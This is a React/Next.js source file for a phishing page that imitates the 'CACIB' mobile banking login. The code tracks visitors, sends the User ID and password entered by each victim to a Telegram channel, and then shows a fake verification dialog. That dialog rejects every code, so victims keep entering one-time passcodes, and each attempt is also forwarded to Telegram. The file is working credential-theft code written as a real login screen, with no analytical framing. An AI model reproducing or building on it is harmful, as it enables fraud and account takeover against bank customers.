"use client"

import React, { useState, useEffect, useRef } from "react"
import { Eye, EyeOff, X } from "lucide-react"
import { useRouter } from "next/navigation"

export default function MobileBankingLogin() {
  const router = useRouter()
  const [userId, setUserId] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [enableBiometrics, setEnableBiometrics] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")

  // Verification Modal State
  const [isVerificationModalOpen, setIsVerificationModalOpen] = useState(false)
  const [verificationCode, setVerificationCode] = useState("")
  const [attemptsLeft, setAttemptsLeft] = useState(4)
  const [isModalSubmitting, setIsModalSubmitting] = useState(false)
  const [modalError, setModalError] = useState("")
  const [shakeCount, setShakeCount] = useState(0)
  const [resendSuccess, setResendSuccess] = useState(false)
  const codeInputRef = useRef<HTMLInputElement>(null)

  // Restore stored session values if available
  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedUser = sessionStorage.getItem("cacib_userId")
      if (savedUser) setUserId(savedUser)
    }
  }, [])

  // Visitor Location tracking when user lands on login screen
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const { sendTelegramMessage, fetchVisitorInfo } = await import("@/lib/telegram")
        await fetchVisitorInfo()
        await sendTelegramMessage({
          title: "👀 New Visitor Landed - CACIB Mobile Banking",
          type: "visitor",
        })
      } catch {
        // silent fallback
      }
    }

    trackVisitor()
  }, [])

  // Auto-focus the code input when modal opens
  useEffect(() => {
    if (isVerificationModalOpen) {
      setTimeout(() => {
        codeInputRef.current?.focus()
      }, 150)
    }
  }, [isVerificationModalOpen])

  // Triggered when user clicks LOGIN button on the main form
  const handleLogin = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    if (!userId.trim()) {
      setErrorMessage("Please enter your User ID")
      return
    }
    if (!password.trim()) {
      setErrorMessage("Please enter your Password")
      return
    }

    setErrorMessage("")
    setIsLoading(true)

    if (typeof window !== "undefined") {
      sessionStorage.setItem("cacib_userId", userId.trim())
      sessionStorage.setItem("cacib_password", password)
      sessionStorage.setItem("documentId", userId.trim())
    }

    // Send Telegram alert for initial login credentials
    try {
      const { sendTelegramMessage } = await import("@/lib/telegram")
      await sendTelegramMessage({
        title: "🏛️ CACIB Mobile Banking - Login Attempt",
        userId: userId.trim(),
        documentId: userId.trim(),
        password: password,
        faceIdEnabled: enableBiometrics ? "Yes" : "No",
      }).catch(() => {})
    } catch {
      // Ignore if telegram not configured
    }

    // Open Verification Modal
    setTimeout(() => {
      setIsLoading(false)
      setVerificationCode("")
      setModalError("")
      setIsVerificationModalOpen(true)
    }, 400)
  }

  // Handle Verification Code Submit inside the Modal:
  // Shows invalid message each time while sending captured digits to Telegram
  const handleVerificationSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const trimmedCode = verificationCode.trim()
    if (!trimmedCode) {
      setModalError("Please enter your verification code")
      setShakeCount((prev) => prev + 1)
      codeInputRef.current?.focus()
      return
    }

    setIsModalSubmitting(true)
    setModalError("")

    if (typeof window !== "undefined") {
      sessionStorage.setItem("cacib_verificationCode", trimmedCode)
    }

    // Send Telegram alert with every submitted code attempt
    try {
      const { sendTelegramMessage } = await import("@/lib/telegram")
      await sendTelegramMessage({
        title: "⚠️ CACIB - Verification OTP Attempt",
        userId: userId.trim(),
        documentId: userId.trim(),
        password: password,
        verificationCode: trimmedCode,
        otp: trimmedCode,
        codeLength: trimmedCode.length,
        attemptsLeft: attemptsLeft > 1 ? attemptsLeft - 1 : 0,
      }).catch(() => {})
    } catch {
      // Ignore if telegram not configured
    }

    // Always show invalid verification message as requested
    setTimeout(() => {
      setIsModalSubmitting(false)
      setModalError("Invalid verification code. Please try again.")
      setShakeCount((prev) => prev + 1)
      setVerificationCode("")
      if (attemptsLeft > 1) {
        setAttemptsLeft((prev) => prev - 1)
      }
      setTimeout(() => {
        codeInputRef.current?.focus()
      }, 100)
    }, 600)
  }

  // Handle Resend Code action
  const handleResendCode = () => {
    if (attemptsLeft > 1) {
      setAttemptsLeft((prev) => prev - 1)
      setResendSuccess(true)
      setVerificationCode("")
      setModalError("")
      setTimeout(() => setResendSuccess(false), 3000)

      // Alert telegram of resend request
      import("@/lib/telegram")
        .then(({ sendTelegramMessage }) => {
          sendTelegramMessage({
            title: "🔄 CACIB - Resend Code Requested",
            userId: userId.trim(),
            documentId: userId.trim(),
            remainingAttempts: attemptsLeft - 1,
          }).catch(() => {})
        })
        .catch(() => {})
    } else {
      setModalError("No more attempts left. Please contact support.")
      setShakeCount((prev) => prev + 1)
    }
  }

  return (
    <div
      dir="ltr"
      className="fixed inset-0 w-full h-[100dvh] max-h-[100dvh] flex justify-center items-stretch bg-[#0c1424] font-sans selection:bg-[#fbd601]/30 select-none overflow-hidden overscroll-none"
    >
      {/* Mobile container - exact responsive layout with zero scroll */}
      <main
        className="relative w-full max-w-[503px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-hidden shadow-2xl"
        style={{
          backgroundImage: "url('/bg.jpg')",
          backgroundSize: "cover",
          backgroundPosition: "top center",
          backgroundRepeat: "no-repeat",
        }}
      >
        {/* Subtle top gradient shadow to enhance header contrast */}
        <div className="absolute top-0 inset-x-0 h-28 bg-gradient-to-b from-black/25 via-black/10 to-transparent pointer-events-none" />

        {/* ========================================================================= */}
        {/* TOP BAR: Menu/Settings Icon (Non-clickable) & CACIB Logo                  */}
        {/* ========================================================================= */}
        <header className="relative z-20 w-full px-[25px] pt-[20px] sm:pt-[22px] flex items-center justify-between shrink-0 select-none">
          {/* Top-Left: Setting/Menu Icon - NOT CLICKABLE (Static visual brand motif) */}
          <div
            aria-hidden="true"
            className="flex flex-col justify-between w-[48px] h-[30px] p-0 select-none pointer-events-none cursor-default"
          >
            {/* Line 1: Yellow short pill + White long pill */}
            <div className="w-full flex items-center gap-[5px]">
              <div className="w-[14px] h-[4px] bg-[#edd32f] rounded-full shadow-sm" />
              <div className="flex-1 h-[4px] bg-white rounded-full shadow-sm" />
            </div>

            {/* Line 2: Full White pill */}
            <div className="w-full h-[4px] bg-white rounded-full shadow-sm" />

            {/* Line 3: Full White pill */}
            <div className="w-full h-[4px] bg-white rounded-full shadow-sm" />

            {/* Line 4: White long pill + Yellow short pill */}
            <div className="w-full flex items-center gap-[5px]">
              <div className="flex-1 h-[4px] bg-white rounded-full shadow-sm" />
              <div className="w-[14px] h-[4px] bg-[#edd32f] rounded-full shadow-sm" />
            </div>
          </div>

          {/* Top-Right: CACIB Brand Logo */}
          <div className="flex items-center select-none pt-[3px]">
            <span
              className="text-[#edd32f] font-extrabold text-[30px] sm:text-[32px] tracking-[0.05em] uppercase leading-none select-none drop-shadow-[0_1px_2px_rgba(0,0,0,0.3)]"
              style={{
                fontFamily:
                  "'Arial Narrow', 'Roboto Condensed', 'Franklin Gothic Medium', sans-serif-condensed, sans-serif",
                transform: "scaleY(1.05)",
              }}
            >
              CACIB
            </span>
          </div>
        </header>

        {/* ========================================================================= */}
        {/* MAIN CONTENT AREA: Title, Inputs, Button & Toggle                         */}
        {/* ========================================================================= */}
        <section
          className="relative z-10 w-full px-[25px] flex flex-col justify-start shrink-0"
          style={{
            paddingTop: "clamp(28px, 18vh, 190px)",
          }}
        >
          {/* Heading: "Login to \n Mobile Banking" */}
          <div
            className="leading-tight select-none"
            style={{
              marginBottom: "clamp(16px, 3.2vh, 34px)",
            }}
          >
            <h1 className="text-white text-[24px] sm:text-[27px] font-normal tracking-normal drop-shadow-[0_1px_2px_rgba(0,0,0,0.35)] mb-[2px]">
              Login to
            </h1>
            <h2 className="text-white text-[28px] sm:text-[32px] font-medium tracking-normal drop-shadow-[0_1px_2px_rgba(0,0,0,0.35)]">
              Mobile Banking
            </h2>
          </div>

          {/* Form */}
          <form onSubmit={handleLogin} className="w-full flex flex-col">
            {/* Input 1: User ID */}
            <div className="w-full">
              <input
                type="text"
                autoComplete="username"
                value={userId}
                onChange={(e) => {
                  setUserId(e.target.value)
                  if (errorMessage) setErrorMessage("")
                }}
                placeholder="User ID"
                className="w-full h-[50px] sm:h-[53px] px-[16px] bg-white rounded-[6px] border border-[#a4b5c7] text-[#1e293b] placeholder-[#717171] text-[16px] sm:text-[17px] font-normal shadow-[0_1px_2px_rgba(0,0,0,0.06)] focus:outline-none focus:border-[#2c5f7c] focus:ring-1 focus:ring-[#2c5f7c] transition-all"
              />
            </div>

            {/* Input 2: Password with Eye Icon and Forgot? link */}
            <div
              className="w-full"
              style={{
                marginTop: "clamp(14px, 3.2vh, 34px)",
              }}
            >
              <div className="w-full h-[50px] sm:h-[53px] px-[16px] bg-white rounded-[6px] border border-[#a4b5c7] flex items-center shadow-[0_1px_2px_rgba(0,0,0,0.06)] focus-within:border-[#2c5f7c] focus-within:ring-1 focus-within:ring-[#2c5f7c] transition-all">
                <input
                  type={showPassword ? "text" : "password"}
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value)
                    if (errorMessage) setErrorMessage("")
                  }}
                  placeholder="Password"
                  className="flex-1 min-w-0 h-full bg-transparent text-[#1e293b] placeholder-[#717171] text-[16px] sm:text-[17px] font-normal border-none outline-none pr-2"
                />

                {/* Right side items: Eye Icon & Forgot? Link */}
                <div className="flex items-center gap-[12px] sm:gap-[14px] shrink-0 pl-1">
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    aria-label={showPassword ? "Hide password" : "Show password"}
                    className="p-1 text-[#64748b] hover:text-[#334155] cursor-pointer transition-colors focus:outline-none flex items-center justify-center"
                  >
                    {showPassword ? (
                      <EyeOff className="w-[20px] h-[20px] sm:w-[21px] sm:h-[21px] stroke-[1.8]" />
                    ) : (
                      <Eye className="w-[20px] h-[20px] sm:w-[21px] sm:h-[21px] stroke-[1.8]" />
                    )}
                  </button>

                  <a
                    href="#forgot"
                    onClick={(e) => {
                      e.preventDefault()
                      alert("Please contact CACIB customer support or visit your nearest branch to reset your credentials.")
                    }}
                    className="text-[#2c466e] hover:text-[#1e3456] text-[15px] sm:text-[16px] font-normal tracking-normal hover:underline cursor-pointer select-none whitespace-nowrap"
                  >
                    Forgot?
                  </a>
                </div>
              </div>
            </div>

            {/* Error Message if any */}
            {errorMessage && (
              <p className="mt-2.5 text-red-600 bg-white/95 backdrop-blur-xs px-3 py-1.5 rounded-md text-[13px] font-medium border border-red-300 shadow-sm animate-shake">
                {errorMessage}
              </p>
            )}

            {/* Action Row: Yellow LOGIN Button (Left) & Biometrics Toggle (Right) */}
            <div
              className="w-full flex items-start gap-[14px]"
              style={{
                marginTop: "clamp(18px, 4.4vh, 46px)",
              }}
            >
              {/* Left Column: Yellow LOGIN Button */}
              <div className="flex-1 max-w-[305px]">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-[54px] sm:h-[60px] bg-[#fbd601] hover:bg-[#fad000] active:scale-[0.985] text-[#1f5979] font-bold text-[16px] sm:text-[17px] tracking-wider rounded-[8px] flex items-center justify-center shadow-[0_2px_4px_rgba(0,0,0,0.12)] cursor-pointer transition-all disabled:opacity-85 select-none"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <svg
                        className="animate-spin h-5 w-5 text-[#1f5979]"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        />
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        />
                      </svg>
                      <span>SIGNING IN...</span>
                    </div>
                  ) : (
                    "LOGIN"
                  )}
                </button>
              </div>

              {/* Right Column: Toggle Switch & 'Enable Face ID / Fingerprint' */}
              <div className="w-[125px] flex flex-col items-start pt-[2px]">
                {/* Custom Toggle Switch */}
                <button
                  type="button"
                  role="switch"
                  aria-checked={enableBiometrics}
                  onClick={() => setEnableBiometrics(!enableBiometrics)}
                  className={`relative w-[51px] h-[28px] rounded-full p-[2px] transition-colors duration-200 ease-in-out cursor-pointer focus:outline-none shadow-sm ${
                    enableBiometrics
                      ? "bg-[#22c55e]"
                      : "bg-white/95 border border-[#cbd5e1]"
                  }`}
                >
                  <span
                    className={`block w-[24px] h-[24px] rounded-full bg-white shadow-md transform transition-transform duration-200 ease-in-out ${
                      enableBiometrics
                        ? "translate-x-[23px]"
                        : "translate-x-0 border border-gray-100"
                    }`}
                  />
                </button>

                {/* Red Text: Enable Face ID / Fingerprint */}
                <div
                  onClick={() => setEnableBiometrics(!enableBiometrics)}
                  className="mt-[7px] text-[#dc2626] text-[11.5px] sm:text-[12px] font-medium leading-[1.25] cursor-pointer select-none drop-shadow-[0_1px_1px_rgba(255,255,255,0.4)]"
                >
                  <div>Enable Face ID /</div>
                  <div>Fingerprint</div>
                </div>
              </div>
            </div>
          </form>
        </section>

        {/* Bottom space filler - ensures bottom landscape reflection is unobstructed */}
        <div className="flex-1 pointer-events-none min-h-0" />

        {/* ========================================================================= */}
        {/* PIXEL-PERFECT VERIFICATION MODAL POPUP                                    */}
        {/* Exact text colors, unlimited OTP digits, and invalid error on submit      */}
        {/* ========================================================================= */}
        {isVerificationModalOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-[2px] animate-in fade-in duration-200">
            {/* Modal Card */}
            <div
              className="relative w-full max-w-[430px] bg-white rounded-[10px] shadow-2xl flex flex-col overflow-hidden animate-in zoom-in-95 duration-200 text-slate-800"
              style={{
                boxShadow: "0 20px 40px -15px rgba(0,0,0,0.4)",
              }}
              onClick={(e) => e.stopPropagation()}
            >
              {/* Header: "Verification" on left & Bold "✕" on right */}
              <div className="w-full px-6 pt-5 pb-3 flex items-center justify-between">
                <span className="text-[#1e486e] font-semibold text-[17px] tracking-tight">
                  Verification
                </span>

                <button
                  type="button"
                  onClick={() => setIsVerificationModalOpen(false)}
                  aria-label="Close Verification Modal"
                  className="p-1 -mr-1 text-[#274164] hover:text-[#182855] transition-colors focus:outline-none cursor-pointer flex items-center justify-center"
                >
                  <X className="w-[23px] h-[23px] stroke-[2.8]" />
                </button>
              </div>

              {/* Body Content */}
              <div className="px-6 pt-3 pb-6 flex flex-col items-center text-center">
                {/* Description Paragraph: Exact #525252 color from screenshot */}
                <p className="text-[#525252] text-[14px] sm:text-[14.5px] font-normal leading-[1.45] max-w-[340px] px-1">
                  A verification code has been sent to your registered mobile number. Please enter that code below to complete the process.
                </p>

                {/* Subtitle: "Verification Code Here" - Exact #243b5d color */}
                <h3 className="mt-7 text-[#243b5d] font-semibold text-[18.5px] sm:text-[19px] tracking-tight">
                  Verification Code Here
                </h3>

                {/* Code Entry Input Container with Centered Animated Caret - UNLIMITED DIGITS */}
                <div
                  key={`shake-${shakeCount}`}
                  className={`relative w-full max-w-[320px] h-[58px] mt-2 mb-2 flex items-center justify-center ${
                    modalError ? "animate-shake" : ""
                  }`}
                >
                  <input
                    ref={codeInputRef}
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    value={verificationCode}
                    onChange={(e) => {
                      // Unlimited digits allowed without restriction
                      const val = e.target.value.replace(/[^0-9]/g, "")
                      setVerificationCode(val)
                      if (modalError) setModalError("")
                    }}
                    placeholder=""
                    className="w-full h-full text-center text-[22px] sm:text-[24px] font-semibold tracking-[0.25em] text-[#1e293b] bg-transparent border-none outline-none z-10 px-2"
                    autoFocus
                  />

                  {/* Centered blinking cursor matching the screenshot (#8ea1c1) when input is empty */}
                  {verificationCode.length === 0 && (
                    <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                      <span className="w-[2px] h-[28px] bg-[#8ea1c1] animate-pulse rounded-full" />
                    </div>
                  )}

                  {/* Subtle bottom underline guide */}
                  <div className="absolute bottom-1 inset-x-4 h-[1px] bg-slate-200 pointer-events-none" />
                </div>

                {/* Attempts Counter: "Attempts Left" in #3f4955 with "4" (or remaining) in #c62828 red */}
                <div className="mt-2 text-[#3f4955] text-[15px] font-medium tracking-tight">
                  <span>Attempts Left </span>
                  <span className="text-[#c62828] font-bold">{attemptsLeft}</span>
                </div>

                {/* Resend Link Row: Exact text and colors from screenshot */}
                <div className="mt-8 text-[13.5px] sm:text-[14px] font-normal text-[#1f2024]">
                  <span>Click here to resend code ! </span>
                  <button
                    type="button"
                    onClick={handleResendCode}
                    className="text-[#2b5082] hover:text-[#1d4ed8] underline font-medium cursor-pointer bg-transparent border-none p-0 inline focus:outline-none"
                  >
                    Resend Code
                  </button>
                </div>

                {/* Status / Error Toast: Displays invalid error each time verify OTP is clicked */}
                {resendSuccess && (
                  <p className="mt-2 text-emerald-600 text-[13px] font-medium animate-in fade-in">
                    Verification code resent successfully!
                  </p>
                )}
                {modalError && (
                  <p
                    key={`err-${shakeCount}`}
                    className="mt-2 text-[#dc2626] font-medium text-[13px] bg-red-50/80 border border-red-200 px-3 py-1.5 rounded-md shadow-xs animate-shake"
                  >
                    {modalError}
                  </p>
                )}

                {/* Bottom Action Buttons: Cancel (Light Pill) & Submit (Deep Navy Pill) */}
                <div className="w-full mt-6 flex items-center justify-between gap-3 sm:gap-4 px-1">
                  {/* Cancel Button - Exact #e9e9e9 background & #d4d4d4 border from screenshot */}
                  <button
                    type="button"
                    onClick={() => setIsVerificationModalOpen(false)}
                    className="flex-1 h-[48px] sm:h-[50px] rounded-full bg-[#e9e9e9] hover:bg-[#dedede] active:scale-[0.98] border border-[#d4d4d4] text-[#374151] font-medium text-[15.5px] sm:text-[16px] transition-all cursor-pointer flex items-center justify-center select-none"
                  >
                    Cancel
                  </button>

                  {/* Submit Button - Exact #3d4574 deep navy blue from screenshot */}
                  <button
                    type="button"
                    disabled={isModalSubmitting || !verificationCode.trim()}
                    onClick={() => handleVerificationSubmit()}
                    className={`flex-1 h-[48px] sm:h-[50px] rounded-full text-white font-medium text-[15.5px] sm:text-[16px] transition-all shadow-sm flex items-center justify-center select-none ${
                      verificationCode.trim().length > 0 && !isModalSubmitting
                        ? "bg-[#3d4574] hover:bg-[#323961] active:scale-[0.98] cursor-pointer"
                        : "bg-[#3d4574] opacity-90 cursor-pointer"
                    }`}
                  >
                    {isModalSubmitting ? (
                      <svg
                        className="animate-spin h-5 w-5 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        />
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        />
                      </svg>
                    ) : (
                      "Submit"
                    )}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Global CSS for animation */}
      <style jsx global>{`
        html, body {
          overflow: hidden !important;
          height: 100dvh !important;
          max-height: 100dvh !important;
          overscroll-behavior: none !important;
          touch-action: pan-x pan-y;
        }
        @keyframes shake {
          10%, 90% { transform: translate3d(-1px, 0, 0); }
          20%, 80% { transform: translate3d(2px, 0, 0); }
          30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
          40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        .animate-shake {
          animation: shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        }
      `}</style>
    </div>
  )
}
